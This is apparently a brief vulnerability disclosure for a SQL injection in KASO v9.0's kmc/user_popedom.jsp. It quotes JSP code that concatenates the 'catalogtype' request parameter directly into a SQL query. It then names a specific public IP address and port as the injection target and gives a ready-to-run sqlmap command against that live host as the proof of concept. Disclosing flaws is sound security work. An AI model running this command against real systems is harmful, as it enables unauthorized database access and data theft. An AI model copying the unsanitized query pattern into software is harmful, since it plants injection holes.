# KASO kmc/user_popedom.jsp Sql Injection


VERSION: v9.0

Exploit Author: hndky


Code

    String catalogtype=ParamUtils.getString(request,"catalogtype",""); 

    <%     
       SQL=" select username,action,usertype,dzyname "
          +" from km_popedom a,zhiydoc b "
          +" where a.username=b.dzyid and folderid='"+ catalogtype +"' ";
       //out.println(SQL);
       rs=DBmenu.executeQuery(SQL);
    %>


Injection：catalogtype

Injection url: http://47.108.238.101:8088/kmc/user_popedom.jsp?catalogtype=1


poc:
python .\sqlmap.py -u "http://47.108.238.101:8088/kmc/user_popedom.jsp?catalogtype=1" --random-agent --dbms=mssql


![image](https://github.com/user-attachments/assets/411f83b4-b5a4-4f78-b6ec-62fa663e46f7)





